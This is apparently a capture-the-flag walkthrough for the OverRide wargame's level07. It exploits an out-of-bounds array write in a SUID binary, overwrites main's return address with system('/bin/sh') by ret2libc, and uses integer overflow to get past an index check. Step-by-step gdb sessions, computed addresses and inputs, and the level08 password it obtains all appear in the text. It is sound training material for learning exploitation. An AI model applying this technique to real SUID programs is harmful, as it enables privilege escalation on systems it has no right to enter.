# Walkthrough for Level 07

## Understanding the Binary

`level07` binary store values in an `store_array` of 100 integers. The index to store the value is read from user input,
but there is no check to verify that the index is within the bounds of the array. This allows us to write to arbitrary
memory locations. We use this vulnerability to overwrite the return address of the `main` function with the address
of the `system` libc function. The argument to `system` will be the string `/bin/sh`. This will spawn a shell when the
`main` function returns. The shell will have the permissions of the `level8`, since `level7` is a SUID binary owned by `level8`.

## Finding the index to overwrite the return address

To find the index to overwrite the return address we use the following equation:
```index = (address of main_return_address - address of store_array) / 4```

### Finding the address of the main_return_address

We can find the address of the return address of the `main` function by using `gdb`. We set a breakpoint at the beginning
of the `main` function and run the binary. When the breakpoint is hit, we use the `info frame` command to find the
return's address location.

```shell
pwndbg> b *main+126
pwndbg> run
Starting program: /home/kali/override/level07/level07 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x080487a1 in main ()
...SNIP...
pwndbg> info frame
Stack level 0, frame at 0xffffd210:
 eip = 0x80488e3 in main; saved eip = 0xf7d8bcc3
 called by frame at 0xffffd270
 Arglist at 0xffffd208, args: 
 Locals at 0xffffd208, Previous frame's sp is 0xffffd210
 Saved registers:
  ebx at 0xffffd1fc, ebp at 0xffffd208, esi at 0xffffd200, edi at 0xffffd204, eip at 0xffffd20c
```

The return address is stored at `0xffffd20c`.

### Finding the address of the store_array

In the disassembly code we see that the `store_array` is stored at `ESP + 0x24`.

```shell
pwndbg> disassemble main
Dump of assembler code for function main:
...SNIP...
0x080488e3 <+448>:   LEA    EAX=>store_array , [ESP + 0x24]
...SNIP...
```

We print the value of `ESP` to calculate the address of the `store_array`.

```shell
pwndbg> p $esp
$1 = (void *) 0xffffd020
```

```store_array = 0xffffd020 + 0x24 = 0xffffd044```

### Calculating the index

Now we can calculate the index to overwrite the return address of the `main` function.

```index = (address of main_return_address - address of store_array) / 4```

```index = (0xffffd20c - 0xffffd044) / 4 = 114```

## Overpassing the restrictions

The program has some restrictions and prevents us using indexes that are multiple of 3.

```c
  if ((index_input % 3 == 0) || (number_input >> 24 == 0xb7)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    ret = 1;
  }
```

So if we try to use the index `114`, the program prints an error message.

```shell
Input command: store
 Number: 4242
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

The solution comes from the fact that the program multiplies the index by 4 before using it to calculate the address to
store the number. More precisely, it bit-shifts the index to the left by 2 bits.

```shell
                     LAB_080486c2                                    XREF[1]:     08048695(j)  
080486c2 8b 45 f4        MOV        ret,dword ptr [EBP + -0xc]=>index_input
080486c5 c1 e0 02        SHL        ret,0x2                                   # bit-shift left by 2 bits
080486c8 03 45 08        ADD        ret,dword ptr [EBP + 0x8]=>store
080486cb 8b 55 f0        MOV        EDX,dword ptr [EBP + -0x10]=>local_14
080486ce 89 10           MOV        dword ptr [ret],EDX
080486d0 b8 00 00        MOV        ret,0x0
         00 00
```

So we need to find an index that when bit-shifted to the left by 2 bits gives us the same result as 114 bit-shifted to
the left by 2 bits. This number can be `2147483762` as shown in the following table:

<table>
  <thead>
    <tr>
      <th></th>
      <th colspan="8">1 Byte</th>
      <th colspan="8">2 Byte</th>
      <th colspan="8">3 Byte</th>
      <th colspan="8">4 Byte</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>114</td>
      <td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td>
      <td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td>
      <td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td>
      <td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td>
    </tr>
    <tr>
      <td>114 &lt;&lt; 2</td>
      <td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td>
      <td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td>
      <td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td>
      <td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td>
    </tr>
    <tr>
      <td>2147483762</td>
      <td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td>
      <td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td>
      <td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td>
      <td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td>
    </tr>
    <tr>
      <td>2147483762 &lt;&lt; 2</td>
      <td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td>
      <td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td>
      <td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td>
      <td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td>
    </tr>
  </tbody>
</table>

In summary, to write at the index `114`, we can use the index `2147483762`. Let's test it.

```shell
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4242      
 Index: 2147483762
 Completed store command successfully
Input command: read 114
 Index: 114
 Number at data[114] is 4242
```

## Finding the addresses of `system` and `/bin/sh`

Now that we have the index to overwrite the return address of the `main` function, we need to find the addresses of
`system` to overwrite the return address with, and the address of the string `/bin/sh` to use as an argument to `system`.

### Finding the address of `system`

Using `gdb`, we set a breakpoint, for example, at the beginning of the `store_number` function, and run the binary.
When the breakpoint is hit, we print the address of `system`.

```shell
(gdb) b *0x804864c
Breakpoint 1 at 0x804864c
(gdb) run
Starting program: /tmp/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: search
 Failed to do search command
Input command: store

Breakpoint 1, 0x0804864c in store_number ()
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

The address is `0xf7e6aed0` (`4159090384` in decimal).

```shell
(gdb) shell python -c "print(0xf7e6aed0)"
4159090384
```

### Finding the address of the string `/bin/sh`

First we need to find the memory mappings of the process to know the range of addresses where the libc is loaded.
Then we can search for the string `/bin/sh` in that range.

```shell
(gdb) info proc mappings
process 1638
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
...SNIP...
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
...SNIP...
(gdb) find 0xf7e2c000 0xf7fd0000 "/bin/sh"
A syntax error in expression, near `0xf7fd0000 "/bin/sh"'.
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

The address is `0xf7f897ec` (`4160264172` in decimal).

```shell
(gdb) shell python -c "print(0xf7f897ec)"
4160264172
```

## Exploiting the vulnerability

We exploit the vulnerability by storing the address of `system` (`4159090384` in decimal) at index `2147483762` (`114`)
and the address of `/bin/sh` (`4160264172` in decimal) at index `116` since at `115` is the return address of `system`.

```shell
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
 ```

When we quit the program, the `main` function returns and executes `system("/bin/sh")`, spawning a shell with the
permissions of `level8`. This allows us to read the password file of `level8` and complete the level.

```shell
Input command: quit
$ whoami
level08
$ cd ../level08
$ cat .pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```